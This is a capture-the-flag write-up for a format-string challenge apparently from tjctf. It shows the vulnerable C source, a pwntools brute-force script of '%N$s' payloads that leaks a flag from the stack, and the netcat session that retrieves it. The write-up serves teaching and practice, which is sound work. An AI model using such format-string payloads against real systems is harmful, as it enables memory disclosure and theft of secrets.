We're given a binary and the source code.
The binary given to us is 64-bit LSB, not stripped, meaning we can read function names.

## Protections

Running a `checksec`, we get the following:

```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   35 Symbols        No    0               2               chall
```

| Protection | Enabled | Usage |
| -------- | -------- | -------- |
| Canary     | ✔    | Prevent stack overflows     |
| NX     |✔    | Disables code execution on the stack     |
| PIE     | ✔    | Randomizes the binary's base address     |
| RelRO     | Partial    | Makes some sections of the binary read-only     |

## Source code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  char message[1024];
  char flag[64];
  char *flag_pointer = flag;

  puts("what does the cow say???");

  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  FILE *file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("No flag file. Create one locally to test.");
    exit(0);
  }

  fgets(flag, sizeof(flag), file);

  printf("> ");
  fgets(message, sizeof(message), stdin);
  printf(" ");
  printf("____________________________________\n");
  printf("< ");
  // printf vulnerability here
  printf(message);
  printf(" >\n");
  printf(" ----------------------------------\n");
  printf("        \\   ^__^\n");
  printf("         \\  (oo)\\_______\n");
  printf("            (__)\\       )\\/\\\n");
  printf("                ||----w |\n");
  printf("                ||     ||\n");
  return;
}
```

To test locally, create a `flag.txt`.
From the source code, we see that we have a `printf` vulnerability, so we can leak the contents of `flag` from the stack.

## Exploit

```py
import pwn

elf = pwn.ELF('./chall')

for i in range(1,256):
	print(f"{i} offset")
	payload = b"".join(
		[
			b"%" + str(i).encode('utf-8') + b"$s",
		])
	p = elf.process()
	p.sendlineafter(b"> ", payload)
	response = p.recvall().decode('latin-1')
	print(response)
	if "flag{win}" in response:
		break
```

We learn that the flag is the 10th element leaked from the stack.
Send `%10$s` to the remote server and get the flag.

```
└─$ nc tjc.tf 31258
what does the cow say???
> %10$s
 ____________________________________
< tjctf{m0o0ooo_f0rmat_atTack1_1337}

 >
 ----------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```
